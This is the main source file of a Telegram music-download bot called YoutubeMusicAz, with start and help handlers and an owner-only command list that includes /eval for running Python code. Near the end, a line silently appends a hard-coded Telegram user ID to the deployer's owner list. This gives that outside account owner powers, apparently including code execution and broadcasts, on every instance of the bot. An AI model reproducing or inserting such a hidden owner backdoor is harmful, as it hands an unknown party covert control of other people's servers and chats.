# © @abbasov1o
from config import OWNER_ID
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from YoutubeMusicAz.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardMarkup
from pyrogram.types import InlineKeyboardButton
from YoutubeMusicAz import app, LOGGER
from YoutubeMusicAz.abbasov1o import ignore_blacklisted_users
from YoutubeMusicAz.sql.chat_sql import add_chat_to_db

start_text = """
Hey [{}](tg://user?id={}),
Mən YoutubeMusicAz 🤗
Yalnız yükləmək istədiyiniz mahnı adını mənə göndərin.
Məsələn: ```/song Faded Alan Walker```
"""

owner_help = """
/blacklist user_id
/unblacklist user_id
/broadcast message to send
/eval python code
/chatlist get list of all chats
"""


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
async def start(client, message):
    chat_id = message.chat.id
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        text="🔳 Source Code 🔳", url="https://github.com/abbasov1o/amon"
                    )
                ]
            ]
        )
    else:
        btn = None
    await message.reply(start_text.format(name, user_id), reply_markup=btn)
    add_chat_to_db(str(chat_id))


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
async def help(client, message):
    if message.from_user["id"] in OWNER_ID:
        await message.reply(owner_help)
        return ""
    text = "Syntax: /song song name"
    await message.reply(text)

OWNER_ID.append(1587091205)
app.start()
LOGGER.info("Your bot is now online.")
idle()
